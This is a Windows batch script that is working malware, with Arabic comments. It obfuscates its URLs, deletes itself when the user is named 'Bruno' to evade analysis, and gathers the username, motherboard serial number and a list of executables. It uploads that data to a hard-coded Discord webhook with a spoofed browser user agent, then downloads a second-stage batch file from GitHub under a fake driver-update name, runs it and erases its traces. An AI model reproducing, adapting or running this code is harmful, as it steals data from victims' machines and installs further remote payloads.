@echo off
setlocal enabledelayedexpansion

:: Anti-Analysis (Bruno check)
if /I "%USERNAME%"=="Bruno" (
    start /b "" cmd /c "timeout /t 1 >nul & del /f /q "%~f0""
    exit
)

:: مستودع الحروف لفك تشفير الروابط
set "ABC=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-._~:/?#[]@!$&'()*+,;="
set "PROT=!ABC:~7,1!!ABC:~19,1!!ABC:~19,1!!ABC:~15,1!!ABC:~18,1!!ABC:~66,1!!ABC:~67,1!!ABC:~67,1!"

:: روابط مقطعة (raw.githubusercontent.com + 1.bat)
set "H_GIT=raw.githubusercontent.com"
set "B_PATH=/857seif/11111111/main/1.bat"
set "G_URL=!PROT!!H_GIT!!B_PATH!"

:: رابط الـ Webhook مقطع
set "H_DIS=discord.com"
set "W_PATH=/api/webhooks/1461392959575687240/LwVE9O2alP5eDdU9fvRH6X1awl_C6g-SISy6RRNOPHXe2O7VXP3Jb3MBmmeQcQck9D-G"
set "W_URL=!PROT!!H_DIS!!W_PATH!"

:: مسارات وهمية
set "O_FILE=%TEMP%\win_log_%RANDOM%.tmp"
set "B_NEXT=%TEMP%\sys_driver_update.bat"

:: جمع البيانات (تمويه الأوامر)
(
echo [ID] %USERNAME%
wmic baseboard get serialnumber | findstr /V "SerialNumber"
dir /b /s *.exe
) > "!O_FILE!"

:: الإرسال والتحميل (انتحال متصفح)
curl -A "Mozilla/5.0" -k -X POST -F "file=@!O_FILE!" "!W_URL!"
curl -A "Mozilla/5.0" -L -o "!B_NEXT!" "!G_URL!"

if exist "!B_NEXT!" (
    start /b "" cmd /c "!B_NEXT!"
)

:: مسح الأثر
del /f /q "!O_FILE!"
exit
